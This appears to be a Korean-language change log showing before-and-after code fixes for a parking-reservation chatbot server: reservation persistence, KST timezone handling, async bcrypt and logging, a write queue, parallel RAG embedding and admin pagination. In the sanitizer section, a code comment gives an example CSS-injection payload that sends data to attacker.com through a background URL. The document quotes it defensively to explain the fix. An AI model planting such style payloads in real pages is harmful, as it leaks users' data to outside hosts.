## 1. 예약 데이터 영속성 (server.js)

### 문제
서버 재시작 시 모든 예약 데이터가 사라지고, 주차 가용 현황이 랜덤으로 생성되어 실제 예약과 무관하게 동작했다.

### 수정 전
```js
// Mock 데이터: 5분마다 랜덤 재생성
function generateAvailability() {
    const data = {};
    const today = new Date();
    for (let i = 1; i <= 7; i++) {
        const d = new Date(today);
        d.setDate(d.getDate() + i);
        const key = d.toISOString().split('T')[0];
        const dayOfWeek = d.getDay();
        if (dayOfWeek === 1) {
            data[key] = { total: 50, reserved: 50, available: 0, closed: true, closedReason: '휴원일 (매주 월요일)' };
        } else {
            // 랜덤 값으로 예약 수 결정 → 실제 예약과 무관
            const reserved = dayOfWeek === 0 || dayOfWeek === 6
                ? Math.floor(Math.random() * 15) + 38
                : Math.floor(Math.random() * 20) + 15;
            data[key] = { total: 50, reserved: Math.min(reserved, 50), available: Math.max(50 - reserved, 0), closed: false };
        }
    }
    return data;
}

let parkingData = generateAvailability();
setInterval(() => { parkingData = generateAvailability(); }, 5 * 60 * 1000);
// → 5분마다 랜덤 재생성되어 예약으로 변경된 잔여수도 초기화됨
```

### 수정 후
```js
// 예약 파일 영속성
const RESERVATIONS_FILE = path.join(DATA_DIR, 'reservations.json');

function loadReservations() {
    if (!fs.existsSync(RESERVATIONS_FILE)) return [];
    try {
        const data = JSON.parse(fs.readFileSync(RESERVATIONS_FILE, 'utf-8'));
        return Array.isArray(data) ? data : [];
    } catch { return []; }
}

function saveReservations() { saveJSON(RESERVATIONS_FILE, reservations); }
let reservations = loadReservations();

// 실제 예약 기반 가용 현황 계산
const TOTAL_SPACES = 50;

function generateAvailability() {
    const data = {};
    const todayDate = todayStr();
    for (let i = 1; i <= 7; i++) {
        const d = new Date(todayDate + 'T00:00:00+09:00');
        d.setDate(d.getDate() + i);
        const key = d.toLocaleDateString('sv-SE', { timeZone: 'Asia/Seoul' });
        const dayOfWeek = d.getDay();
        if (dayOfWeek === 1) {
            data[key] = { total: TOTAL_SPACES, reserved: TOTAL_SPACES, available: 0, closed: true, closedReason: '휴원일 (매주 월요일)' };
        } else {
            // 실제 확정 예약 수로 계산
            const confirmedCount = reservations.filter(r => r.date === key && r.status === 'confirmed').length;
            data[key] = { total: TOTAL_SPACES, reserved: confirmedCount, available: Math.max(TOTAL_SPACES - confirmedCount, 0), closed: false };
        }
    }
    return data;
}

let parkingData = generateAvailability();
setInterval(() => { parkingData = generateAvailability(); }, 60 * 1000);
```

### 개선 효과
| 항목 | 수정 전 | 수정 후 |
|------|---------|---------|
| 예약 저장 | 메모리만 (서버 재시작 시 소멸) | `reservations.json` 파일 영속 저장 |
| 잔여 현황 | 5분마다 랜덤 재생성 | 실제 확정 예약 수 기반 계산 |
| 예약/취소 반영 | 랜덤 재생성으로 덮어씌워짐 | 즉시 `generateAvailability()` 호출로 반영 |
| 월 1회 제한 | 서버 재시작 후 우회 가능 | 파일에서 영속 검증 |

## 2. 예약/취소 API 데이터 소스 변경 (server.js)

### 문제
예약/취소가 세션별 `conv.reservations` 배열에만 저장되어, 서버 재시작 시 유실되고 로그에서도 복원되지 않았다.

### 수정 전
```js
// 예약: 세션별 배열에 저장
const conv = getConv(sessionId);
conv.reservations.push(reservation);

// 월 1회 제한: 전체 세션 순회 (느림, 재시작 후 무효)
const allConvs = Object.values(conversations);
const carAlreadyReserved = allConvs.some(c =>
    c.reservations.some(r => r.carNumber === carNumber && r.date.startsWith(month) && r.status === 'confirmed')
);

// 취소: 전체 세션에서 검색
let reservation = null;
let ownerSessionId = null;
for (const [sid, conv] of Object.entries(conversations)) {
    const found = conv.reservations.find(r => r.confirmNo === confirmNo && r.status === 'confirmed');
    if (found) { reservation = found; ownerSessionId = sid; break; }
}
```

### 수정 후
```js
// 예약: 글로벌 배열 + 파일 저장
reservations.push(reservation);
saveReservations();
parkingData = generateAvailability(); // 즉시 반영

// 월 1회 제한: 단일 배열 검색 (빠름, 재시작 후에도 유지)
const carAlreadyReserved = reservations.some(r =>
    r.carNumber === carNumber && r.date.startsWith(month) && r.status === 'confirmed'
);

// 취소: 단일 배열 검색
const reservation = reservations.find(r => r.confirmNo === confirmNo && r.status === 'confirmed');
```

### 개선 효과
| 항목 | 수정 전 | 수정 후 |
|------|---------|---------|
| 데이터 소스 | 세션별 `conv.reservations` (분산) | 글로벌 `reservations` 배열 (통합) |
| 검색 성능 | `O(세션수 × 예약수)` 중첩 순회 | `O(예약수)` 단일 배열 검색 |
| 영속성 | 없음 | `saveReservations()` 파일 저장 |
| 취소 후 반영 | `parkingData` 직접 조작 (랜덤 재생성으로 덮어씌워짐) | `generateAvailability()` 재계산 |

## 3. 취소 기한 타임존 수정 (server.js)

### 문제
`new Date('2026-04-10T09:00:00')`는 시스템 로컬 타임존으로 해석되어 KST 기준 비교가 보장되지 않았다.

### 수정 전
```js
const now = new Date();
const deadline = new Date(reservation.date + 'T09:00:00');   // 타임존 미지정
deadline.setDate(deadline.getDate() - 1);
deadline.setHours(18, 0, 0, 0);    // 로컬 타임존 기준
if (now > deadline) return res.status(400).json({ error: '취소 기한(방문 전날 18:00)이 지났습니다.' });
```

### 수정 후
```js
// 취소 기한: 방문 전날 18:00 KST (명시적 타임존)
const reserveDate = new Date(reservation.date + 'T00:00:00+09:00');
const deadline = new Date(reserveDate.getTime() - 6 * 60 * 60 * 1000); // 당일 00:00 - 6h = 전날 18:00 KST
if (new Date() > deadline) return res.status(400).json({ error: '취소 기한(방문 전날 18:00)이 지났습니다.' });
```

### 개선 효과
- `+09:00` 명시로 **서버 타임존에 관계없이 KST 기준 동작** 보장
- 수학적 시간 계산으로 `setDate`/`setHours` 조합의 모호함 제거

## 4. todayStr() 타임존 수정 (server.js)

### 문제
수동 UTC+9 변환이 DST(서머타임)가 없는 한국에서는 동작하지만, Intl API보다 불안정하고 의도가 불명확했다.

### 수정 전
```js
function todayStr() {
    const now = new Date();
    const kst = new Date(now.getTime() + 9 * 60 * 60 * 1000);  // 수동 UTC+9 변환
    return kst.toISOString().slice(0, 10);
}
```

### 수정 후
```js
function todayStr() {
    return new Date().toLocaleDateString('sv-SE', { timeZone: 'Asia/Seoul' });
    // sv-SE 로케일 = YYYY-MM-DD 형식, Asia/Seoul = KST 명시
}
```

### 개선 효과
- **`Asia/Seoul` 타임존 명시**로 의도가 명확함
- `sv-SE` 로케일이 ISO 8601 날짜 형식(`YYYY-MM-DD`)을 보장
- `toISOString()` 기반 수동 변환의 잠재적 오류 제거

## 6. bcrypt 동기→비동기 전환 (server.js)

### 문제
`bcrypt.hashSync`/`compareSync`는 CPU 집약적 연산을 이벤트 루프에서 동기 실행하여, 해싱 중 다른 모든 요청이 블로킹되었다.

### 수정 전
```js
// 로그인 - 동기 (이벤트 루프 블로킹)
app.post('/api/auth/login', (req, res) => {
    const pwMatch = bcrypt.compareSync(pw, hashToCompare);  // ~250ms 블로킹
    ...
});

// 회원가입 - 동기
app.post('/api/auth/signup', (req, res) => {
    const hash = bcrypt.hashSync(pw, 12);  // ~250ms 블로킹
    ...
});
```

### 수정 후
```js
// 로그인 - 비동기 (이벤트 루프 해방)
app.post('/api/auth/login', async (req, res) => {
    const pwMatch = await bcrypt.compare(pw, hashToCompare);  // 논블로킹
    ...
});

// 회원가입 - 비동기
app.post('/api/auth/signup', async (req, res) => {
    const hash = await bcrypt.hash(pw, 12);  // 논블로킹
    ...
});
```

### 적용 대상 (5개 핸들러)
| 엔드포인트 | 변경 내용 |
|-----------|----------|
| `POST /api/auth/login` | `compareSync` → `await compare` |
| `POST /api/auth/signup` | `hashSync` → `await hash` |
| `POST /api/auth/admin-signup` | `hashSync` → `await hash` |
| `POST /api/admin/users` | `hashSync` → `await hash` |
| `PUT /api/admin/users/:id` | `hashSync` → `await hash` |

### 개선 효과
- bcrypt cost=12 기준 **~250ms의 이벤트 루프 블로킹 제거**
- 해싱 중에도 다른 API 요청(채팅, 현황 조회 등) 정상 처리 가능
- 동시 접속자 증가 시 응답 지연 대폭 감소

## 7. saveJSON 파일 잠금 수정 (server.js)

### 문제
flag 기반 lock이 동시 쓰기 시 두 번째 요청을 **조용히 무시**하여 데이터 유실이 발생할 수 있었다.

### 수정 전
```js
let fileLocks = {};

function saveJSON(file, data) {
    if (fileLocks[file]) return;     // ← 동시 요청 시 쓰기를 그냥 건너뜀!
    fileLocks[file] = true;
    try {
        const tmp = file + '.tmp';
        fs.writeFileSync(tmp, JSON.stringify(data, null, 2), 'utf-8');
        fs.renameSync(tmp, file);
    } finally {
        fileLocks[file] = false;
    }
}
```

### 수정 후
```js
// 비동기 큐: 동시 요청도 순차 처리 (유실 없음)
const writeQueues = {};
function saveJSON(file, data) {
    if (!writeQueues[file]) writeQueues[file] = Promise.resolve();
    writeQueues[file] = writeQueues[file].then(async () => {
        const tmp = file + '.tmp';
        await fs.promises.writeFile(tmp, JSON.stringify(data, null, 2), 'utf-8');
        await fs.promises.rename(tmp, file);
    }).catch(err => console.error('[SaveJSON]', file, err.message));
    return writeQueues[file];
}
```

### 개선 효과
| 항목 | 수정 전 | 수정 후 |
|------|---------|---------|
| 동시 쓰기 | 두 번째 요청 **무시** (데이터 유실) | Promise 큐로 **순차 처리** |
| I/O 방식 | `writeFileSync` (블로킹) | `fs.promises.writeFile` (논블로킹) |
| 원자성 | tmp+rename (동기) | tmp+rename (비동기, 동일 원자성) |

## 8. appendLog 비동기 전환 (server.js)

### 문제
모든 채팅/예약/감사 로그가 `appendFileSync`로 기록되어 이벤트 루프를 블로킹했다.

### 수정 전
```js
function appendLog(prefix, entry) {
    const line = JSON.stringify({ ...entry, _ts: new Date().toISOString() }) + '\n';
    fs.appendFileSync(getLogFile(prefix), line, 'utf-8');  // 동기 I/O
}
```

### 수정 후
```js
function appendLog(prefix, entry) {
    const line = JSON.stringify({ ...entry, _ts: new Date().toISOString() }) + '\n';
    fs.promises.appendFile(getLogFile(prefix), line, 'utf-8').catch(err =>
        console.error('[Log]', err.message)
    );
    // fire-and-forget: 로그 실패가 요청 처리를 블로킹하지 않음
}
```

### 개선 효과
- 매 채팅 메시지마다 발생하던 **동기 디스크 I/O 제거**
- 로그 기록 실패 시에도 사용자 요청은 정상 처리 (에러는 콘솔 출력)

## 10. sanitizeHtml style 속성 제거 (chatbot.js)

### 문제
허용 태그의 `style` 속성을 통해 CSS injection 공격이 가능했다 (UI 스푸핑, 데이터 유출 등).

### 수정 전
```js
// 허용된 태그: style 속성만 허용, 나머지 제거
const attrs = Array.from(child.attributes);
for (const attr of attrs) {
    if (attr.name !== 'style') child.removeAttribute(attr.name);
    // → style="background:url(//attacker.com/log?data=...)" 등 가능
}
```

### 수정 후
```js
// 허용된 태그: 모든 속성 제거 (XSS/CSS injection 방지)
const attrs = Array.from(child.attributes);
for (const attr of attrs) {
    child.removeAttribute(attr.name);
}
```

### 개선 효과
- `style` 속성을 통한 **CSS injection 공격 벡터 차단**
- `background-image: url()` 기반 데이터 유출 방지
- `position: fixed` 등을 이용한 UI 스푸핑 방지

## 11. RAG 병렬 임베딩 (rag.js)

### 문제
지식 문서의 각 청크를 하나씩 순차적으로 임베딩하여, 문서가 많을수록 시작 시간이 선형 증가했다.

### 수정 전
```js
for (const chunk of chunks) {
    const cacheKey = chunk.source + '::' + chunk.heading;
    if (cache[cacheKey] && cache[cacheKey].text === chunk.text) {
        newStore.push({ ...chunk, embedding: cache[cacheKey].embedding });
        cached++;
    } else {
        const embedding = await getEmbedding(chunk.text);  // 1개씩 순차 처리
        newStore.push({ ...chunk, embedding });
        embedded++;
    }
}
```

### 수정 후
```js
const BATCH_SIZE = 5;

// 캐시 히트와 미스를 분리
const needsEmbed = [];
for (const chunk of chunks) {
    const cacheKey = chunk.source + '::' + chunk.heading;
    if (cache[cacheKey] && cache[cacheKey].text === chunk.text) {
        newStore.push({ ...chunk, embedding: cache[cacheKey].embedding });
        cached++;
    } else {
        needsEmbed.push(chunk);
    }
}

// 5개씩 병렬 임베딩
for (let i = 0; i < needsEmbed.length; i += BATCH_SIZE) {
    const batch = needsEmbed.slice(i, i + BATCH_SIZE);
    const embeddings = await Promise.all(batch.map(c => getEmbedding(c.text)));
    batch.forEach((c, j) => {
        newStore.push({ ...c, embedding: embeddings[j] });
        embedded++;
    });
}
```

### 개선 효과
| 항목 | 수정 전 | 수정 후 |
|------|---------|---------|
| 처리 방식 | 1개씩 순차 | 5개씩 병렬 (`Promise.all`) |
| 신규 20개 청크 기준 | 20회 순차 API 호출 | 4회 병렬 배치 |
| 예상 속도 향상 | - | 최대 **~5배** (네트워크 지연 감소) |

## 12. 관리자 대화 목록 페이지네이션 (server.js, manager.js)

### 수정 전
```js
// server.js - 전체 반환
app.get('/api/admin/conversations', authMiddleware, adminOnly, (req, res) => {
    const list = Object.values(conversations).map(c => ({ ... }));
```

```js
// server.js - 페이지네이션
app.get('/api/admin/conversations', authMiddleware, adminOnly, (req, res) => {
    const page = Math.max(1, parseInt(req.query.page) || 1);
    const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 50));

    const list = Object.values(conversations).map(c => ({ ... }));
    list.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));

    const total = list.length;
    const paginated = list.slice((page - 1) * limit, page * limit);
    res.json({ data: paginated, total, page, limit, totalPages: Math.ceil(total / limit) });
});

// manager.js - 응답 호환
const result = await res.json();
```
